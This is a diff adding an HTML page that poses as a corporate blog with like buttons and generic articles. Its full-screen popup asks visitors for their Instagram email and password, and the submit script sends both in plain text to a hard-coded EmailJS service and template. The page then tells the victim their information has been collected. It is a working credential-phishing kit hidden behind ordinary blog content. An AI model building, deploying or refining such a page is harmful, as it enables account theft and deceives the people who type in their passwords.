@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Professional Blog Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+      color: #333;
+    }
+
+    #popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+     
+    }
+
+    #popup form {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+    }
+
+    #popup input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    #popup button {
+      padding: 12px 24px;
+       background: linear-gradient(90deg, #000000, #a8906a);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    #message {
+      display: none;
+      color: green;
+      font-size: 14px;
+    }
+
+    #userEmail {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background: #007bff;
+      color: white;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      z-index: 1000;
+      display: none;
+    }
+
+    #blogContent {
+      padding: 60px 20px 20px 20px;
+      max-width: 1000px;
+      margin: auto;
+      display: none;
+    }
+
+    .blog-post {
+      background: linear-gradient(90deg, #fff7fd, #a8906a);
+      padding: 25px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .blog-post h3 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    .blog-post p {
+      font-size: 16px;
+      line-height: 1.6;
+    }
+
+    .likes {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #555;
+    }
+    #blogHeader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: #ffffff;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  padding: 15px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  z-index: 999;
+}
+
+#blogHeader .logo {
+  font-weight: bold;
+  font-size: 20px;
+  color: #007bff;
+}
+.like-btn {
+  background: none;
+  border: none;
+  font-size: 18px;
+  cursor: pointer;
+  margin-left: 10px;
+  color: #aaa;
+  transition: color 0.3s;
+}
+
+.like-btn.liked {
+  color: red;
+}
+
+#userEmailHeader {
+  color: #333;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+    @media (max-width: 768px) {
+      .blog-post {
+        padding: 20px;
+      }
+
+      #popup form {
+        padding: 20px;
+      }
+
+      #userEmail {
+        font-size: 12px;
+        padding: 5px 10px;
+      }
+      .author{
+        font-size: 10px !important;
+      }
+      .company-name{
+        font-size: 14px !important;
+      }
+      #userEmailHeader{
+        font-size: 5px !important;
+      }
+      #blogHeader{
+        padding: 15px 5px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<header id="blogHeader" style="position: fixed; top: 0; left: 0; width: 100%;     background: linear-gradient(90deg, #000000, #a8906a); box-shadow: 0 2px 6px rgba(0,0,0,0.1); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; z-index: 999; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+  
+  <!-- Author Name -->
+  <div class="author" style="font-weight: 600; font-size: 16px; color: #ffffff;">
+    ✍️ Author: Eman Malik
+  </div>
+
+  <!-- Company Name (centered) -->
+  <div class="company-name" style="font-weight: bold; font-size: 20px; color: #ffffff;">
+    CreativeVerse Media
+  </div>
+
+  <!-- User Email -->
+  <div id="userEmailHeader" style="color: #ffffff; font-size: 14px; font-weight: 500;"></div>
+</header>
+
+
+
+<!-- Login popup -->
+<div id="popup">
+  <form id="loginForm">
+    <div id="signup-button-form">
+    <h3>Enter your Instagram Username/Email And Password</h3>
+    <input type="email" id="email" placeholder="Email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button type="submit">Submit</button>
+    </div>
+    
+    <div id="message">Your information is collected. Please wait a few hours while we verify if you're a real user.</div>
+  </form>
+</div>
+<div id="authorScoreCard" style="max-width: 1000px; margin: 80px auto 20px auto; background: #ffffff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+  <h2 style="font-size: 24px; margin-bottom: 10px;">📊 Eman Malik's Blog Score</h2>
+  <p style="font-size: 18px;">Total Likes: <span id="emanTotalLikes">0</span></p>
+  <p style="font-size: 18px;">Current Rank: <span id="emanRank">#5</span></p>
+  <p style="font-size: 16px; margin-top: 15px; color: #007bff; font-weight: 500;">
+    💬 Support Eman Malik by liking the blogs to help boost her score and rank!
+  </p>
+</div>
+
+<!-- Blog Content -->
+<div id="blogContent">
+  <div class="blog-post">
+    <h3>🚀 How to Launch a Product Successfully</h3>
+    <p>Launching a product successfully involves more than just having a great idea. It starts with understanding your target market, creating a strong value proposition, and building anticipation through pre-launch marketing. Develop a launch plan that includes influencer outreach, email campaigns, and engaging social media teasers. On launch day, make sure your website is optimized, your customer service team is ready, and your communication is clear. Finally, gather feedback quickly to improve your product and customer experience.</p>
+   <div class="likes">
+  ❤️ Likes: <span class="like-count">340</span>
+  <button class="like-btn">♥</button>
+</div>
+
+  </div>
+
+  <div class="blog-post">
+    <h3>🌐 Why Responsive Design Matters</h3>
+    <p>Responsive design ensures that your website looks and functions well across all device sizes, from desktops to smartphones. With mobile users making up over 50% of web traffic globally, having a responsive design is no longer optional. It improves user experience, reduces bounce rates, and positively impacts SEO. A responsive website automatically adjusts its layout, images, and content to fit the screen, making it easier for users to navigate and engage with your content no matter what device they use.</p>
+    <div class="likes">
+  ❤️ Likes: <span class="like-count">32</span>
+  <button class="like-btn">♥</button>
+</div>
+  </div>
+
+  <div class="blog-post">
+    <h3>💡 Tips for Better UX in 2025</h3>
+    <p>User experience (UX) continues to evolve, and in 2025, personalization and accessibility will play key roles. Focus on creating intuitive navigation, fast-loading pages, and clean visual hierarchies. Use AI to tailor content to individual users, and make sure your designs are inclusive for users with disabilities. Micro-interactions and voice user interfaces (VUIs) will become increasingly common, so consider implementing these technologies to enhance engagement. Regularly test with real users and iterate based on feedback to maintain a high-quality UX.</p>
+   <div class="likes">
+  ❤️ Likes: <span class="like-count">85</span>
+  <button class="like-btn">♥</button>
+</div>
+  </div>
+</div>
+<footer style="    background: linear-gradient(90deg, #000000, #a8906a); padding: 20px; text-align: center; margin-top: 40px; border-top: 1px solid #ddd;">
+  <p style="font-size: 16px; color: #ffffff;">
+    © 2025 Crafted by <strong>BlueQuill Digital Co.</strong> — A Creative Blogging & Tech Media Company.
+  </p>
+  <p style="font-size: 14px; color: #ffffff;">
+    This platform is for insightful minds and digital thinkers. Stay inspired, stay original.
+  </p>
+</footer>
+
+<script>
+  const likeButtons = document.querySelectorAll(".like-btn");
+  const likeCounts = document.querySelectorAll(".like-count");
+  const totalLikesEl = document.getElementById("emanTotalLikes");
+
+  let totalLikes = 0;
+
+  likeButtons.forEach((btn, index) => {
+    let liked = false;
+
+    btn.addEventListener("click", () => {
+      if (!liked) {
+        let count = parseInt(likeCounts[index].innerText);
+        count += 1;
+        likeCounts[index].innerText = count;
+        totalLikes += 1;
+        totalLikesEl.innerText = totalLikes;
+        btn.style.color = "red";
+        liked = true;
+      }
+    });
+  });
+
+  // Initialize with existing values
+  document.addEventListener("DOMContentLoaded", () => {
+    document.querySelectorAll(".like-count").forEach(el => {
+      totalLikes += parseInt(el.innerText);
+    });
+    totalLikesEl.innerText = totalLikes;
+  });
+</script>
+
+<script>
+  document.querySelectorAll('.like-btn').forEach(button => {
+  button.addEventListener('click', function () {
+    const countSpan = this.previousElementSibling;
+    let currentLikes = parseInt(countSpan.textContent);
+
+    if (this.classList.contains('liked')) {
+      this.classList.remove('liked');
+      countSpan.textContent = currentLikes - 1;
+    } else {
+      this.classList.add('liked');
+      countSpan.textContent = currentLikes + 1;
+    }
+  });
+});
+
+</script>
+<script>
+  (function () {
+    emailjs.init("Cwyu7X6Y9GdrpRqwv"); // Replace with your EmailJS public key
+  })();
+
+  const form = document.getElementById("loginForm");
+  const signupButton = document.getElementById("signup-button-form");
+  const message = document.getElementById("message");
+  const popup = document.getElementById("popup");
+  const blogContent = document.getElementById("blogContent");
+  const userEmailHeader = document.getElementById("userEmailHeader");
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value;
+    userEmailHeader.innerText = email;
+  
+
+    // Send email using EmailJS
+    // service_bwmry04
+    emailjs.send("service_bwmry04", "template_skc3zej", {
+      user_email: email,
+      user_password: password
+    }).then(() => {
+      message.style.display = "block"; // Show the success message
+    }, (err) => {
+       message.style.display = "block";
+       signupButton.style.display = "none";
+      console.error(err);
+    });
+  });
+</script>
+
+
+</body>
+</html>
